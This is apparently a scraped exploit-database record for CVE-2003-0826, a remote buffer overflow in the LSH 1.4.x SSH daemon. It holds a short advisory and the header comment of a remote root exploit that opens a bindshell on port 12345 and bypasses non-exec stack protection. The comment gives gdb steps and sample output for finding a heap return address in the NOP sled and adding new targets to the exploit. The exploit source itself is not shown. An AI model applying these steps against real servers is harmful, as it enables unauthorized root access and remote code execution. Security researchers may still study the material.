{
    "text": "ecve : CVE-2003-0826 ， title : LSH 1.x - Remote Buffer Overflow ( 1 ) - Linux remote Exploit ， verified : Verified ， exploit_detail : // source :  ， lsh has been reported prone to a remote buffer overflow vulnerability. The condition is reported to present itself in fairly restrictive circumstances , and has been reported to be exploitable pre-authentication. Successful exploitation could result in the execution of arbitrary attacker supplied instructions in the context of the affected daemon. ， / *  ， Remote r00t exploit for lsh 1.4.x ， by Haggis aka Carl Livitt - carl.learningshophull @ co @ uk ， 19/09/2003 ， Latest version should always be available from ， Spawns bindshell on port 12345 of remote host. ， Handily , it also bypasses non-exec stack protection as the ， shellcode is on the heap. ， NOTE : This exploit _only_ works if it's the first thing to ， connect to the lshd daemon after it has been started. ， Any other time , it is just a DoS. Run it a few times against ， a host running lshd to see what I mean. ， Determining RET address for a new Start up 'lshd -daemonic' , attach gdb to it and 'c'ontinue :  ， sol :  ~  # rm /var/run/lshd.pid ; lshd -daemonic ; gdb -q lshd `pgrep lshd` ， Attaching to program : /usr/local/sbin/lshd , process 7140 ， Reading symbols from /lib/libpam.so.0...done. ， Loaded symbols for /lib/libpam.so.0 ， Reading symbols from /lib/libutil.so.1...done. ， Loaded symbols for /lib/libutil.so.1 ， Reading symbols from /lib/libnsl.so.1...done. ， Loaded symbols for /lib/libnsl.so.1 ， Reading symbols from /lib/libcrypt.so.1...done. ， Loaded symbols for /lib/libcrypt.so.1 ， Reading symbols from /lib/libz.so.1...done. ， Loaded symbols for /lib/libz.so.1 ， Reading symbols from /usr/local/lib/liboop.so.4...done. ， Loaded symbols for /usr/local/lib/liboop.so.4 ， Reading symbols from /usr/lib/libgmp.so.3...done. ， Loaded symbols for /usr/lib/libgmp.so.3 ， Reading symbols from /lib/libc.so.6...done. ， Loaded symbols for /lib/libc.so.6 ， Reading symbols from /lib/libdl.so.2...done. ， Loaded symbols for /lib/libdl.so.2 ， Reading symbols from /lib/ld-linux.so.2...done. ， Loaded symbols for /lib/ld-linux.so.2 ， Reading symbols from /lib/libnss_files.so.2...done. ， Loaded symbols for /lib/libnss_files.so.2 ， 0x40157d37 in fork (  ) from /lib/libc.so.6 ，  ( gdb ) c ， Continuing. ， Switch to another terminal , and run the exploit against the lsh ， server , specifying target number 3 ( Test )  :  ， haggis @ sol :  ~ /exploits/research/lsh> ./lsh_exploit -t localhost -T 3 ， LSH 1.4.x ( others? ) exploit by Haggis ( haggis @ haggis.kicks-ass.net )  ，  [ - ] Building exploit buffer... ，  [ - ] Sending exploit string... ，  [ - ] Sleeping... ，  [ - ] Connecting to bindshell... ，  [  *  ] Could not connect to localhost - the exploit failed ， Switch back to your other terminal. You will see :  ， Program received signal SIGSEGV , Segmentation fault. ， 0x41424344 in ?? (  )  ， Type 'x/1000x $ eax' :  ，  ( gdb ) x/1000x $ eax ， And wait until you find lines similar to these :  ， 0x809fa68 : 0x90909090 0x90909090 0x90909090 0x90909090 ， 0x809fa78 : 0x90909090 0x90909090 0x90909090 0x90909090 ， 0x809faa8 : 0x90909090 0x90909090 0x90909090 0x90909090 ， 0x809fa9c : 0x90909090 0x90909090 0x90909090 0x90909090 ， Any of the addresses that contains a NOP ( 0x90 ) can be used as your RET address. ， Create a new target in the source-code and Bob's-yer-uncle !  ，  * /",
    "time": "2003-09-19"
}